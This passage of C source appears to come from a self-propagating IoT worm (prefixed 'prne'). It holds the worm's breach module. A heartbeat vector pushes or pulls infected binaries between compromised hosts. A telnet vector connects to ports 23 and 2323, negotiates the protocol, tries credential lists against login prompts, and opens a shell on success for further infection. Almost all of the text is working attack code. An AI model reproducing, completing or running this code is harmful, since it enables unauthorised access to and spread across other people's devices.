	pth_event_t ev)
{
	return bne_vhtbt_recvf(
		ctx,
		vctx,
		st,
		(prne_htbt_dser_ft)prne_htbt_dser_status,
		ev);
}

static uint16_t bne_vhtbt_msgid_f (void *ctx) {
	uint16_t ret = 0;

	prne_rnd((prne_rnd_t*)ctx, (uint8_t*)&ret, sizeof(ret));
	return ret;
}

static bool bne_vhtbt_do_ayt (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	pth_event_t *ev)
{
	bool ret = false;
	prne_htbt_msg_head_t mh;

	prne_htbt_init_msg_head(&mh);
	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev)) {
		goto END;
	}
	if (!bne_vhtbt_recv_mh(ctx, vctx, &mh, *ev)) {
		goto END;
	}
	ret = mh.id == PRNE_HTBT_OP_NOOP && mh.is_rsp;
END:
	prne_htbt_free_msg_head(&mh);
	return ret;
}

static bool bne_vhtbt_query_hostinfo (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	prne_htbt_host_info_t *hi,
	pth_event_t *ev)
{
	bool ret = false;
	prne_htbt_msg_head_t mh;
	prne_htbt_status_t st;

	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_status(&st);
	mh.id = prne_htbt_gen_msgid(&ctx->rnd, bne_vhtbt_msgid_f);
	mh.op = PRNE_HTBT_OP_HOST_INFO;

	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev)) {
		goto END;
	}

	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
	if (!bne_vhtbt_recv_mh(ctx, vctx, &mh, *ev)) {
		goto END;
	}
	switch (mh.op) {
	case PRNE_HTBT_OP_STATUS:
		bne_vhtbt_recv_status(ctx, vctx, &st, *ev);
		break;
	case PRNE_HTBT_OP_HOST_INFO:
		ret = bne_vhtbt_recvf(
			ctx,
			vctx,
			hi,
			(prne_htbt_dser_ft)prne_htbt_dser_host_info,
			*ev);
		break;
	}

END:
	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_status(&st);
	return ret;
}

static bool bne_vhtbt_do_upbin_us (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	pth_event_t *ev)
{
	bool ret = false;
	char *tmpfile_path = NULL;
	int fd = -1;
	prne_htbt_msg_head_t mh;
	prne_htbt_status_t st;
	prne_htbt_rcb_t rcb_f;
	prne_htbt_stdio_t stdio_f;
	prne_htbt_cmd_t cmd;
	ssize_t f_ret;

	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_status(&st);
	prne_htbt_init_rcb(&rcb_f);
	prne_htbt_init_stdio(&stdio_f);
	prne_htbt_init_cmd(&cmd);
// TRY
	fd = ctx->param.cb.tmpfile(
		ctx->param.cb_ctx,
		O_CREAT | O_TRUNC | O_WRONLY | O_EXCL,
		0700,
		0,
		&tmpfile_path);
	if (fd < 0) {
		goto END;
	}
	fcntl(fd, F_SETFD, FD_CLOEXEC);

	mh.id = prne_htbt_gen_msgid(&ctx->rnd, bne_vhtbt_msgid_f);
	mh.op = PRNE_HTBT_OP_RCB;
	rcb_f.os = PRNE_HOST_OS;
	rcb_f.arch = PRNE_HOST_ARCH;
	rcb_f.compat = true;

	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev)) {
		goto END;
	}
	if (!bne_vhtbt_sendf(
		ctx,
		vctx,
		&rcb_f,
		(prne_htbt_ser_ft)prne_htbt_ser_rcb,
		*ev))
	{
		goto END;
	}

	do {
		prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
		if (!bne_vhtbt_recv_mh(ctx, vctx, &mh, *ev)) {
			goto END;
		}
		switch (mh.op) {
		case PRNE_HTBT_OP_STDIO: break;
		case PRNE_HTBT_OP_STATUS:
			bne_vhtbt_recv_status(ctx, vctx, &st, *ev);
			goto END;
		default:
			goto END;
		}
		if (!bne_vhtbt_recvf(
			ctx,
			vctx,
			&stdio_f,
			(prne_htbt_dser_ft)prne_htbt_dser_stdio,
			*ev))
		{
			goto END;
		}

		while (stdio_f.len > 0) {
			f_ret = bne_vhtbt_read(
				ctx,
				vctx,
				vctx->stdioib.m,
				stdio_f.len,
				*ev);
			if (f_ret < 0) {
				goto END;
			}
			if (f_ret == 0) {
				goto END;
			}
			prne_iobuf_shift(&vctx->stdioib, f_ret);
			stdio_f.len -= f_ret;

			while (vctx->stdioib.len > 0) {
				f_ret = write(fd, vctx->stdioib.m, vctx->stdioib.len);
				if (f_ret < 0) {
					goto END;
				}
				if (f_ret == 0) {
					goto END;
				}
				prne_iobuf_shift(&vctx->stdioib, -f_ret);
			}
		}

		pth_yield(NULL);
	} while (!stdio_f.fin);
	ctx->param.cb.upbin(ctx->param.cb_ctx, tmpfile_path, &cmd);
	ret = true;

END:
	if (!ret && tmpfile_path != NULL) {
		unlink(tmpfile_path);
	}
	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_status(&st);
	prne_htbt_free_rcb(&rcb_f);
	prne_htbt_free_stdio(&stdio_f);
	prne_htbt_free_cmd(&cmd);
	prne_free(tmpfile_path);
	prne_close(fd);
	return ret;
}

static bool bne_vhtbt_do_upbin_them (
	prne_bne_t *ctx,
	bne_vhtbt_ctx_t *vctx,
	const prne_htbt_host_info_t *hi,
	pth_event_t *ev)
{
	bool ret = false;
	prne_bin_rcb_ctx_t rcbctx;
	prne_pack_rc_t prc;
	prne_bin_host_t target;
	prne_htbt_msg_head_t mh;
	prne_htbt_bin_meta_t bm;
	prne_htbt_stdio_t sh;
	prne_iobuf_t rcb_ib;
	ssize_t io_ret;
	int perr = 0;

	prne_init_bin_rcb_ctx(&rcbctx);
	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_bin_meta(&bm);
	prne_htbt_init_stdio(&sh);
	prne_init_iobuf(&rcb_ib);

	if (!prne_try_alloc_iobuf(&rcb_ib, BNE_STDIO_IB_SIZE)) {
		goto END;
	}

	target.os = hi->os;
	target.arch = hi->arch;

	prc = prne_start_bin_rcb_compat(
		&rcbctx,
		target,
		ctx->param.rcb->self,
		ctx->param.rcb->m_self,
		ctx->param.rcb->self_len,
		ctx->param.rcb->exec_len,
		ctx->param.rcb->m_dv,
		ctx->param.rcb->dv_len,
		ctx->param.rcb->ba,
		NULL);
	if (prc != PRNE_PACK_RC_OK) {
		goto END;
	}

	mh.id = prne_htbt_gen_msgid(&ctx->rnd, bne_vhtbt_msgid_f);
	mh.op = PRNE_HTBT_OP_UP_BIN;
	bm.alloc_len = prne_op_min(
		ctx->param.rcb->self_len,
		PRNE_HTBT_BIN_ALLOC_LEN_MAX);
	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev) ||
		!bne_vhtbt_sendf(
			ctx,
			vctx,
			&bm,
			(prne_htbt_ser_ft)prne_htbt_ser_bin_meta,
			*ev))
	{
		goto END;
	}

	mh.op = PRNE_HTBT_OP_STDIO;
	do {
		prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);

		io_ret = prne_bin_rcb_read(
			&rcbctx,
			rcb_ib.m,
			rcb_ib.avail,
			&prc,
			&perr);
		if (io_ret < 0) {
			goto END;
		}
		prne_iobuf_shift(&rcb_ib, io_ret);

		if (rcb_ib.len > 0) {
			sh.len = rcb_ib.len;
			if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev) ||
				!bne_vhtbt_sendf(
					ctx,
					vctx,
					&sh,
					(prne_htbt_ser_ft)prne_htbt_ser_stdio,
					*ev) ||
				!bne_vhtbt_flush_ib(ctx, vctx, &rcb_ib, *ev))
			{
				goto END;
			}
		}

		pth_yield(NULL);
	} while (prc != PRNE_PACK_RC_EOF);
	sh.fin = true;
	sh.len = 0;
	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
	ret =
		bne_vhtbt_send_mh(ctx, vctx, &mh, *ev) &&
		!bne_vhtbt_sendf(
			ctx,
			vctx,
			&sh,
			(prne_htbt_ser_ft)prne_htbt_ser_stdio,
			*ev);

END:
	prne_free_iobuf(&rcb_ib);
	prne_free_bin_rcb_ctx(&rcbctx);
	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_bin_meta(&bm);
	prne_htbt_free_stdio(&sh);
	return ret;
}

static bool bne_do_vec_htbt (prne_bne_t *ctx) {
	bool ret = false;
	bne_vhtbt_ctx_t vctx;
	pth_event_t ev = NULL;
	prne_htbt_host_info_t hi;

	vctx.ep.addr = ctx->param.subject;
	vctx.ep.port = (uint16_t)PRNE_HTBT_PROTO_PORT;
	vctx.fd = -1;
	mbedtls_ssl_init(&vctx.ssl);
	prne_htbt_init_host_info(&hi);
	prne_init_iobuf(&vctx.netib);
	prne_init_iobuf(&vctx.stdioib);

// TRY
	if (!prne_alloc_iobuf(&vctx.netib, PRNE_HTBT_PROTO_MIN_BUF)) {
		goto END;
	}
	for (unsigned int i = 0; i < BNE_CONN_ATTEMPT; i += 1) {
		ret = bne_vhtbt_do_handshake(ctx, &vctx, &ev);
		if (ret) {
			break;
		}
	}
	if (!ret) {
		goto END;
	}

	// M2M binary update
	do { // fake
		int f_ret;

		if (ctx->param.cb.vercmp == NULL) {
			break;
		}
		if (!bne_vhtbt_query_hostinfo(ctx, &vctx, &hi, &ev)) {
			goto END;
		}

		f_ret = ctx->param.cb.vercmp(ctx->param.cb_ctx, hi.prog_ver);
		if (f_ret != 0) {
			if (!prne_alloc_iobuf(&vctx.stdioib, PRNE_HTBT_STDIO_LEN_MAX)) {
				goto END;
			}
		}

		if (f_ret < 0) {
			if (ctx->param.cb.uptime == NULL ||
				ctx->param.cb.tmpfile == NULL ||
				ctx->param.cb.upbin == NULL)
			{
				break;
			}
			if (ctx->param.cb.uptime(ctx->param.cb_ctx) < BNE_M2M_UPBIN_INT) {
				break;
			}
			if (!bne_vhtbt_do_ayt(ctx, &vctx, &ev)) {
				goto END;
			}
			if (!bne_vhtbt_do_upbin_us(ctx, &vctx, &ev)) {
				goto END;
			}
		}
		else if (f_ret > 0) {
			if (hi.parent_uptime < BNE_M2M_UPBIN_INT) {
				break;
			}
			if (!bne_vhtbt_do_ayt(ctx, &vctx, &ev)) {
				goto END;
			}
			if (ctx->param.rcb != NULL) {
				if (!bne_vhtbt_do_upbin_them(ctx, &vctx, &hi, &ev)) {
					goto END;
				}
			}
			else {
				// TODO
			}
		}
	} while (false);

	// Terminate connection gracefully
	prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
	if (prne_mbedtls_pth_handle(
			&vctx.ssl,
			mbedtls_ssl_close_notify,
			vctx.fd,
			ev,
			NULL))
	{
		prne_shutdown(vctx.fd, SHUT_RDWR);
	}

END: // CATCH
	if (!ret) {
		ctx->result.err = errno;
	}
	prne_free_iobuf(&vctx.netib);
	prne_free_iobuf(&vctx.stdioib);
	mbedtls_ssl_free(&vctx.ssl);
	prne_close(vctx.fd);
	pth_event_free(ev, FALSE);
	prne_htbt_free_host_info(&hi);

	return ret;
}

/*******************************************************************************
                              Telnet Vector Impl
*******************************************************************************/
static const char BNE_VTN_NL[] = "\r\n";
#define BNE_VTN_NL_LEN (sizeof(BNE_VTN_NL) - 1)

static void bne_vtn_drop_conn (bne_vtn_ctx_t *t_ctx) {
	prne_free(t_ctx->prompt_line);
	t_ctx->prompt_line = NULL;
	t_ctx->prompt_line_len = 0;
	prne_free(t_ctx->m_lefto);
	t_ctx->m_lefto = t_ctx->ptr_lefto = NULL;
	t_ctx->lefto_len = 0;
	prne_shutdown(t_ctx->fd, SHUT_RDWR);
	prne_close(t_ctx->fd);
	t_ctx->fd = -1;
}

/*
*
* 1: OK
* 0: Format error
* -1: errno set
*/
static int bne_vtn_parse_pdata (
	const uint8_t *in_data,
	const size_t in_len,
	size_t *p_start,
	size_t *p_len,
	uint8_t **m_pout,
	size_t *pout_len)
{
	uint8_t wont_buf[3];
	bool iac = false;
	uint8_t opt_code;
	const uint8_t *m_snd = NULL;
	size_t snd_len = 0;

	for (*p_start = 0; *p_start < in_len; *p_start += 1) {
		if (in_data[*p_start] == 255) {
			iac = true;
			break;
		}
	}

	if (iac) {
		*p_len = 2;
	}
	else {
		*p_len = 0;
		return 1;
	}

	if (*p_start + 1 >= in_len) {
		return 1;
	}

	switch (in_data[*p_start + 1]) {
	case 240: // SE
		// SE without SB. This is a malformed command
		return 0;
	case 241: // NOP
	case 242: // Synch
	case 243: // Break
	case 244: // IP
	case 245: // AO
	case 246: // AYT
	case 247: // EC
	case 248: // EL
	case 249: // GA
		return 1;
	case 250: // SB
	case 251: // WILL
	case 252: // WONT
	case 253: // DONT
	case 254: // DO
		// option code required
		*p_len = 3;
		if (*p_start + 2 >= in_len) {
			return 1;
		}
		break;
	default:
		return 0;
	}
	opt_code = in_data[*p_start + 2];

	switch (in_data[*p_start + 1]) {
	case 250: // SB
		// find the SE of this SB
		for (size_t i = *p_start + 3; i < in_len; i += 1) {
			if (in_data[i] == 255 && i + 1 < in_len) {
				*p_len += 2;
				if (in_data[i + 1] != 240) {
					return 0;
				}
				// do something with this data
				break;
			}
			else {
				*p_len += 1;
			}
		}
		break;
	case 251: // WILL
	case 252: // WONT
	case 254: // DONT
		break; // ignore
	case 253: // DO
		if (opt_code == 31) { // NAW
			static const uint8_t DAT[] = {
				// IAC WILL NAWS
				255, 251, 31,
				// IAC SB NAWS 0 80 0 24 IAC SE
				255, 250, 31, 0, 80, 0, 24, 255, 240
			};
			m_snd = DAT;
			snd_len = sizeof(DAT);
		}
		else {
			// IAC WONT WHATEVER-IT-IS
			wont_buf[0] = 255;
			wont_buf[1] = 252;
			wont_buf[2] = opt_code;
			m_snd = wont_buf;
			snd_len = 3;
		}
		break;
	}

	if (snd_len > 0) {
		void *ny;

		ny = prne_realloc(*m_pout, 1, snd_len);
		if (ny == NULL) {
			return -1;
		}
		*m_pout = (uint8_t*)ny;
		*pout_len = snd_len;
		memcpy(*m_pout, m_snd, snd_len);
	}

	return 1;
}

static bool bne_vtn_push_data (
	struct pollfd *pfd,
	const uint8_t *buf,
	size_t len,
	pth_event_t ev)
{
	ssize_t f_ret;

	while (len > 0) {
		pfd->events = POLLOUT;
		f_ret = prne_pth_poll(pfd, 1, -1, ev);
		if (f_ret <= 0) {
			return false;
		}

		f_ret = write(pfd->fd, buf, len);
		if (f_ret <= 0) {
			return false;
		}
		buf += f_ret;
		len -= f_ret;
	}

	return true;
}

static ssize_t bne_vtn_read_f (
	void *ctx_p,
	void *buf,
	const size_t len,
	pth_event_t ev)
{
	bne_vtn_ctx_t *ctx = (bne_vtn_ctx_t*)ctx_p;
	struct pollfd pfd;
	ssize_t f_ret;

	if (ctx->lefto_len > 0) {
		// if there's leftover data from handshake phase, return that
		const size_t consume = prne_op_min(len, ctx->lefto_len);

		memcpy(buf, ctx->ptr_lefto, consume);
		ctx->ptr_lefto += consume;
		ctx->lefto_len -= consume;

		if (ctx->lefto_len == 0) {
			prne_free(ctx->m_lefto);
			ctx->m_lefto = ctx->ptr_lefto = NULL;
		}

		return consume;
	}

	pfd.fd = ctx->fd;
	pfd.events = POLLIN;
	f_ret = prne_pth_poll(&pfd, 1, -1, ev);
	if (f_ret < 0) {
		return -1;
	}

	return read(ctx->fd, buf, len);
}

static ssize_t bne_vtn_write_f (
	void *ctx_p,
	const void *buf,
	const size_t len,
	pth_event_t ev)
{
	bne_vtn_ctx_t *ctx = (bne_vtn_ctx_t*)ctx_p;
	struct pollfd pfd;
	ssize_t f_ret;
	size_t rem = len, sent = 0;

	pfd.fd = ctx->fd;
	pfd.events = POLLOUT;

	while (rem > 0) {
		f_ret = prne_pth_poll(&pfd, 1, -1, ev);
		if (f_ret < 0) {
			return -1;
		}

		f_ret = write(ctx->fd, buf, rem);
		if (f_ret < 0) {
			return f_ret;
		}
		if (f_ret == 0) {
			return sent;
		}

		buf = (const uint8_t*)buf + f_ret;
		rem -= f_ret;
		sent += f_ret;
	}

	return sent;
}

static bool bne_vtn_flush_f (void *ctx_p) {
	bne_vtn_ctx_t *ctx = (bne_vtn_ctx_t*)ctx_p;
	uint8_t buf[1024];
	ssize_t f_ret;

	while (true) {
		f_ret = read(ctx->fd, buf, sizeof(buf));
		if (f_ret < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK) {
				return true;
			}
			return false;
		}
		if (f_ret == 0) {
			return true;
		}
	}
}

static bool bne_vtn_handshake (bne_vtn_ctx_t *t_ctx, pth_event_t ev) {
	static const size_t BUF_SIZE = 512;
	static const uint8_t INIT_OUT[] = {
		// IAC DO SUPPRESS-GO-AHEAD
		255, 253, 3,
		// IAC WILL NAWS
		255, 251, 31
	};
	bool ret = false;
	uint8_t *m_pout = NULL;
	size_t pout_len = 0;
	size_t p_start, p_len = 0, np_len;
	uint8_t buf[BUF_SIZE];
	prne_iobuf_t ib;
	ssize_t f_ret;
	struct pollfd pfd;

	prne_init_iobuf(&ib);
	prne_iobuf_setextbuf(&ib, buf, BUF_SIZE, 0);
	pfd.fd = t_ctx->fd;

// TRY
	// send initial commands
	if (!bne_vtn_push_data(&pfd, INIT_OUT, sizeof(INIT_OUT), ev)) {
		goto END;
	}

	while (true) {
		if (p_len > ib.len || ib.len == 0) {
			// read data for the first time or
			// read until no IAC is found in the stream
			pfd.events = POLLIN;
			f_ret = prne_pth_poll(&pfd, 1, -1, ev);
			if (f_ret <= 0) {
				goto END;
			}

			f_ret = read(pfd.fd, ib.m + ib.len, ib.avail);
			if (f_ret <= 0) {
				goto END;
			}
			prne_iobuf_shift(&ib, f_ret);
		}

		pout_len = 0;
		f_ret = bne_vtn_parse_pdata(
			ib.m,
			ib.len,
			&p_start,
			&p_len,
			&m_pout,
			&pout_len);
		if (f_ret <= 0) {
			if (f_ret == 0) {
				errno = EPROTO;
			}
			goto END;
		}
		if (p_len > ib.size) {
			// need more buffer to process this command
			errno = EPROTO;
			goto END;
		}

		if (!bne_vtn_push_data(&pfd, m_pout, pout_len, ev)) {
			goto END;
		}

		// save non-protocol data for later consumption
		np_len = p_start;
		if (np_len > 0) {
			void *ny = prne_realloc(
				t_ctx->m_lefto,
				1,
				t_ctx->lefto_len + np_len);

			if (ny == NULL) {
				goto END;
			}
			t_ctx->ptr_lefto = t_ctx->m_lefto = (uint8_t*)ny;
			memcpy(t_ctx->m_lefto + t_ctx->lefto_len, ib.m, np_len);
			t_ctx->lefto_len += np_len;
		}
		prne_iobuf_shift(&ib, -np_len);

		if (p_len <= ib.len) {
			// bne_vtn_parse_pdata() was able to consume some protocol data
			prne_iobuf_shift(&ib, -p_len);
		}
		if (p_len == 0 && pout_len == 0) {
			// IAC not found in the stream and no command produced
			// end of telnet negotiation
			ret = true;
			break;
		}
	}

END: // CATCH
	prne_free_iobuf(&ib);
	prne_free(m_pout);

	return ret;
}

static bool bne_vtn_est_conn (prne_bne_t *ctx, bne_vtn_ctx_t *t_ctx) {
	bool ret = false;
	pth_event_t ev = NULL;
	const struct timespec *pause = NULL;
	prne_net_endpoint_t ep;

	if (t_ctx->fd >= 0) {
		return true;
	}

	ep.addr = ctx->param.subject;

	while (t_ctx->ports.size > 0 &&
		pth_event_status(ev) != PTH_STATUS_OCCURRED)
	{
		bne_port_t *p = (bne_port_t*)t_ctx->ports.head->element;

		ep.port = p->port;

		if (pause != NULL) {
			pth_nanosleep(pause, NULL);
			pause = NULL;
		}
		bne_vtn_drop_conn(t_ctx);
		p->attempt += 1;

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
			prne_dbgpf(
				"bne vtn@%"PRIxPTR"\t: knocking %"PRIu16"\n",
				(uintptr_t)ctx,
				p->port);
		}

		prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
		if (!bne_do_connect(&t_ctx->fd, &ep, ev)) {
			ctx->result.err = errno;
			goto END;
		}
		if (t_ctx->fd < 0) {
			pause = &BNE_ERR_PAUSE;
			if (p->attempt >= BNE_CONN_ATTEMPT) {
				goto POP;
			}
			continue;
		}

		if (bne_vtn_handshake(t_ctx, ev)) {
			ctx->result.err = 0;
			ret = true;
			break;
		}
		else {
			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
				prne_dbgpf(
					"bne vtn@%"PRIxPTR"\t: handshake failed on port "
					"%"PRIu16"\n",
					(uintptr_t)ctx,
					ep.port);
			}
		}
		/* fall-through */
POP:
		// try next port
		prne_free(p);
		prne_llist_erase(&t_ctx->ports, t_ctx->ports.head);
	}

END:
	if (ev != NULL && pth_event_status(ev) == PTH_STATUS_OCCURRED) {
		ctx->result.err = ETIMEDOUT;
	}
	pth_event_free(ev, FALSE);
	if (!ret) {
		bne_vtn_drop_conn(t_ctx);
	}

	return ret;
}

/*
*
* This function only works against conventional /bin/login program.
* We assume that "conventional" /bin/login has following prompt structure:
*
*	[hostname ]login:
*	Password:
*	Login incorrect
*
* This functions will not work against login prompt structure other than this.
*
* Return:
*	1: successful login
*	0: unsuccessful login
*	-1: IO error. Re-establish connection and keep trying!
*/
static int bne_vtn_try_cred (
	prne_bne_t *ctx,
	bne_vtn_ctx_t *t_ctx,
	pth_event_t ev)
{
	static const char LOGIN_P[] = "login:";
	static const char PWD_P[] = "password:";
	static const char INC_P[] = "incorrect";
#define LOGIN_P_LEN (sizeof(LOGIN_P) - 1)
#define PWD_P_LEN (sizeof(LOGIN_P) - 1)
#define INC_P_LEN (sizeof(INC_P) - 1)
	int ret = -1;
	char *prompt_nl[3];
	char *p_login, *p_line, *ib_end;
	uint8_t buf[2048];
	prne_iobuf_t ib;
	ssize_t f_ret;
	size_t len;

	prne_init_iobuf(&ib);
	prne_iobuf_setextbuf(&ib, buf, sizeof(buf), 0);

	// sync login prompt
	prne_iobuf_reset(&ib);
	while (true) {
		f_ret = bne_vtn_read_f(t_ctx, ib.m + ib.len, ib.avail, ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_transcmem(ib.m + ib.len, f_ret, prne_ctolower);
		prne_iobuf_shift(&ib, f_ret);

		if (t_ctx->prompt_line == NULL) {
			p_login = (char*)prne_memrmem(
				ib.m,
				ib.len,
				LOGIN_P,
				LOGIN_P_LEN);
			if (p_login == NULL) {
				continue;
			}
			len = p_login - (char*)ib.m;

			prompt_nl[0] = (char*)prne_memrchr(ib.m, '\r', len);
			prompt_nl[1] = (char*)prne_memrchr(ib.m, '\n', len);
			prompt_nl[2] = (char*)prne_memrchr(ib.m, '\0', len);
			if (prompt_nl[0] != NULL || prompt_nl[1] != NULL) {
				// newline char found
				if (prompt_nl[0] + 1 == prompt_nl[1]) {
					// CrLf
					p_line = prompt_nl[1] + 1;
				}
				else if (prompt_nl[0] + 1 == prompt_nl[2]) {
					// CrNul
					p_line = prompt_nl[2] + 1;
				}
				else {
					p_line = prne_op_max(prompt_nl[0], prompt_nl[1]) + 1;
				}
			}
			else {
				p_line = (char*)ib.m;
			}

			// trailing characters must be whitespaces
			ib_end = (char*)ib.m + ib.len;
			for (char *i = p_login + LOGIN_P_LEN; i < ib_end; i += 1) {
				if (!prne_cisspace(*i)) {
					continue;
				}
			}

			// copy the prompt line for later use
			len = ib_end - p_line;
			t_ctx->prompt_line = prne_alloc_str(len);
			if (t_ctx->prompt_line != NULL) {
				t_ctx->prompt_line_len = len;
				memcpy(t_ctx->prompt_line, p_line, len);
				t_ctx->prompt_line[len] = 0;
			}
		}
		else if (prne_memmem(
			ib.m,
			ib.len,
			t_ctx->prompt_line,
			t_ctx->prompt_line_len) == NULL)
		{
			continue;
		}

		break;
	}

	// send ID
	len = strlen(ctx->result.cred.id);
	if (bne_vtn_write_f(t_ctx, ctx->result.cred.id, len, ev) != (ssize_t)len) {
		goto END;
	}
	// send nl
	if (bne_vtn_write_f(
		t_ctx,
		BNE_VTN_NL,
		BNE_VTN_NL_LEN,
		ev) != (ssize_t)BNE_VTN_NL_LEN)
	{
		goto END;
	}

	// sync password prompt
	prne_iobuf_reset(&ib);
	while (true) {
		f_ret = bne_vtn_read_f(t_ctx, ib.m + ib.len, ib.avail, ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_transcmem(ib.m + ib.len, f_ret, prne_ctolower);
		prne_iobuf_shift(&ib, f_ret);

		if (prne_memmem(ib.m, ib.len, PWD_P, PWD_P_LEN) != NULL) {
			break;
		}
		else if (memchr(ib.m, '>', ib.len) != NULL ||
			memchr(ib.m, '$', ib.len) != NULL ||
			memchr(ib.m, '#', ib.len) != NULL ||
			memchr(ib.m, '%', ib.len) != NULL ||
			memchr(ib.m, ':', ib.len) != NULL)
		{
			// password not prompted
			ret = 1;
			goto END;
		}
	}

	// send PW
	len = strlen(ctx->result.cred.pw);
	if (bne_vtn_write_f(t_ctx, ctx->result.cred.pw, len, ev) != (ssize_t)len) {
		goto END;
	}
	// send nl
	if (bne_vtn_write_f(
		t_ctx,
		BNE_VTN_NL,
		BNE_VTN_NL_LEN,
		ev) != (ssize_t)BNE_VTN_NL_LEN)
	{
		goto END;
	}

	// sync answer
	prne_iobuf_reset(&ib);
	while (true) {
		f_ret = bne_vtn_read_f(t_ctx, ib.m + ib.len, ib.avail, ev);
		if (f_ret <= 0) {
			goto END;
		}
		prne_transcmem(ib.m + ib.len, f_ret, prne_ctolower);
		prne_iobuf_shift(&ib, f_ret);

		if (prne_memmem(ib.m, ib.len, INC_P, INC_P_LEN) != NULL ||
			prne_memmem(
				ib.m,
				ib.len,
				t_ctx->prompt_line,
				t_ctx->prompt_line_len) != NULL)
		{
			// feed the read data back to the stream...
			// if it doesn't look good to you, too bad
			prne_free(t_ctx->m_lefto);
			t_ctx->m_lefto = t_ctx->ptr_lefto =
				(uint8_t*)prne_malloc(1, ib.len);
			if (t_ctx->m_lefto == NULL) {
				t_ctx->lefto_len = 0;
				ret = -1;
				break;
			}
			memcpy(t_ctx->m_lefto, ib.m, ib.len);
			t_ctx->lefto_len = ib.len;

			ret = 0;
			break;
		}
		else if (memchr(ib.m, '>', ib.len) != NULL ||
			memchr(ib.m, '$', ib.len) != NULL ||
			memchr(ib.m, '#', ib.len) != NULL ||
			memchr(ib.m, '%', ib.len) != NULL ||
			memchr(ib.m, ':', ib.len) != NULL)
		{
			ret = 1;
			break;
		}
	}

END:
	prne_free_iobuf(&ib);

	return ret;
#undef LOGIN_P_LEN
#undef PWD_P_LEN
#undef INC_P_LEN
}

static bool bne_vtn_login (prne_bne_t *ctx, bne_vtn_ctx_t *t_ctx) {
	bool ret = false;
	pth_event_t ev = NULL;
	int f_ret;

	while (true) {
		if (ctx->param.login_attempt > 0 &&
			t_ctx->login_cnt > ctx->param.login_attempt)
		{
			break;
		}

		if (!bne_vtn_est_conn(ctx, t_ctx)) {
			break;
		}

		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			if (!bne_pop_cred(ctx, false)) {
				break;
			}
		}

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
			prne_dbgpf(
				"bne vtn@%"PRIxPTR"\t: trying cred %s %s\n",
				(uintptr_t)ctx,
				ctx->result.cred.id,
				ctx->result.cred.pw);
		}

		prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		f_ret = bne_vtn_try_cred(ctx, t_ctx, ev);
		t_ctx->login_cnt += 1;
		if (f_ret < 0) {
			bne_vtn_drop_conn(t_ctx);
			continue;
		}
		else if (f_ret == 0) {
			bne_free_result_cred(ctx);
			continue;
		}

		ret = true;
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne vssh@%"PRIxPTR"\t: authenticated using cred %s %s\n",
				(uintptr_t)ctx,
				ctx->result.cred.id,
				ctx->result.cred.pw);
		}
		break;
	}

	pth_event_free(ev, FALSE);
	return ret;
}

static bool bne_vtn_do_shell (prne_bne_t *ctx, bne_vtn_ctx_t *t_ctx) {
	bne_sh_ctx_t sh_ctx;
	bool ret;

	bne_init_sh_ctx(&sh_ctx, &ctx->rnd);
	sh_ctx.ctx = t_ctx;
	sh_ctx.read_f = bne_vtn_read_f;
	sh_ctx.write_f = bne_vtn_write_f;
	sh_ctx.flush_f = bne_vtn_flush_f;
	sh_ctx.nl = "\r\n";

	ret = bne_do_shell(ctx, &sh_ctx);

	bne_free_sh_ctx(&sh_ctx);
	return ret;
}

static bool bne_do_vec_telnet (prne_bne_t *ctx) {
	static const uint16_t SSH_PORTS[] = { 23, 2323 };
	bool ret = false;
	bne_vtn_ctx_t vtn_ctx;

	prne_memzero(&vtn_ctx, sizeof(bne_vtn_ctx_t));
	vtn_ctx.fd = -1;
	prne_init_llist(&vtn_ctx.ports);

	bne_free_result_cred(ctx);

	for (size_t i = 0; i < sizeof(SSH_PORTS)/sizeof(uint16_t); i += 1) {
		bne_port_t *p = prne_calloc(sizeof(bne_port_t), 1);

		if (p == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		p->port = SSH_PORTS[i];

		if (!prne_llist_append(
			&vtn_ctx.ports,
			(prne_llist_element_t)p))
		{
			prne_free(p);
			ctx->result.err = errno;
			goto END;
		}
	}

	if (!bne_build_cred_set(ctx)) {
		ctx->result.err = errno;
		goto END;
	}

	if (!bne_vtn_login(ctx, &vtn_ctx)) {
		goto END;
	}

	ret = bne_vtn_do_shell(ctx, &vtn_ctx);

END:
	bne_vtn_drop_conn(&vtn_ctx);
	for (prne_llist_entry_t *e = vtn_ctx.ports.head; e != NULL; e = e->next) {
		prne_free((void*)e->element);
	}
	prne_free_llist(&vtn_ctx.ports);

	return ret;
}

/*******************************************************************************
                                SSH Vector Impl
*******************************************************************************/
